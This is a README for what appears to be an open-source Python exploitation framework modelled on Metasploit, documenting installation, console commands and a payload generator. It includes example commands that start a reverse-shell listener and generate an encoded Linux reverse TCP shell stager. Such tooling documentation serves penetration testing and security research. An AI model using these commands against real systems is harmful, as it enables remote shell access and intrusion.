
# Terasploit Framework

**An opensource python exploitation framework for security researchers and red team operators.**

---

## Overview

**Terasploit Framework (TSF)** is a structured exploitation framework built entirely in Python, designed for security researchers, penetration testers, and red team operators.

Inspired by the architecture and workflow of Metasploit, TSF explores a Python-first approach - leveraging the language most dominant across modern cybersecurity tooling. Where existing frameworks are often tied to Ruby, TSF prioritises Python's ecosystem, accessibility, and integration potential.

The long-term goal is a powerful, community-driven framework that pairs Metasploit's proven workflow model with Python's flexibility.

---

## Requirements

**Python 3.13 or later** is required.

```bash
pip install -r data/requirements/reqs-extra.txt
```

---

## Installation

```bash
# Clone the repository
git clone https://github.com/0x4steroth/terasploit.git
cd terasploit

# Install extras
pip install -r data/requirements/reqs-extra.txt

# Make entry points executable
chmod +x teraconsole terax terasm

# No package installation step is required. The framework adds its own root to `sys.path` at startup.
./teraconsole
```

### System Installation

```bash
# Clone the repository
git clone https://github.com/0x4steroth/terasploit.git
cd terasploit

# Install via pip - be careful with '--break-system-packages'
python3 -m pip install -e . --break-system-packages

# Execute
teraconsole

```

---

## Usage

### `teraconsole`

Launch the interactive Terasploit console:

```bash
./teraconsole [OPTIONS]
```

| Flag | Description |
|---|---|
| `-d`, `--debug` | Enable verbose/debug output |
| `-v`, `--version` | Print version and exit |
| `-q`, `--quiet` | Skip the banner |
| `-r FILE` | Execute commands from a resource (`.rc`) script |
| `-m MODULE` | Preload a module before dropping into the REPL |
| `-x "CMDs"` | Run semicolon-separated commands, then drop to REPL |

**Quick example - start a listener via command line:**

```bash
./teraconsole -q -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run"
```

**Common console commands:**

```
use <module>          Load a module by path
show options          Display current module options
show advanced         Display advanced options
set <KEY> <value>     Set an option value
run / exploit         Execute the active module
sessions              List active sessions
sessions -i <id>      Interact with a session
jobs                  List background jobs
back                  Unload the current module
help                  Show all available commands
exit / quit           Exit the console
```

---

### `terax`

Standalone payload generator - mirrors the msfvenom workflow:

```bash
./terax [OPTIONS] [KEY=VALUE ...]
```

| Flag | Description |
|---|---|
| `-p <payload>` | Payload module path to generate |
| `-f <format>` | Output format (`raw`, `hex`, `c`, `python`, …) |
| `-e <encoder>` | Encoder to apply |
| `-i <n>` | Number of encoding iterations |
| `-b <chars>` | Bad characters to avoid (e.g. `\x00\x0a`) |
| `-s <size>` | Maximum payload size in bytes |
| `--nop-sled <n>` | Prepend N NOP bytes |
| `-o <file>` | Write output to file |
| `-l payloads` | List available payloads |
| `-l encoders` | List available encoders |
| `-l formats` | List available output formats |

**Example - Linux x64 reverse shell, XOR-encoded, null-free, C output:**

```bash
./terax -p payload/stagers/linux/x64/shell/reverse_tcp \
        LHOST=192.168.1.10 LPORT=4444 \
        -e encoder/x64/xor_dynamic \
        -b '\x00' \
        -f c
```

---

## Development

**Linting and formatting** via [Ruff](https://docs.astral.sh/ruff/):

```bash
ruff check .           # lint
ruff check --fix .     # auto-fix safe issues
ruff format .          # format
```

**Type checking** via [Pyright](https://github.com/microsoft/pyright):

```bash
pyright
```

**Adding a new payload platform/architecture:**

1. Implement the shellcode under `teralibs/tsf/core/payload/<platform>/<arch>/`
2. Create the module file under `modules/payload/<type>/<platform>/<arch>/`
3. Restart or `reload` - the module is discovered automatically

**Adding a new module type:**

Follow the skeletons in [`docs/terasploit.wiki/guide/Module-Development.md`](docs/terasploit.wiki/guide/Module-Development.md) and drop the file into the correct `modules/` subdirectory.

---

## Contributing

Contributions are welcome. Please open an issue before starting work on significant changes. All modules should pass `ruff check` and `pyright` before submission.

---

## Disclaimer

Terasploit is intended exclusively for **authorized security testing and educational research**. Use against systems you do not own or lack explicit written permission to test is illegal and unethical. The authors accept no liability for misuse.

---

<div align="center">
<sub>Built with Python · BSD-3-Clause · <a href="https://github.com/0x4steroth/terasploit">github.com/0x4steroth/terasploit</a></sub>
</div>
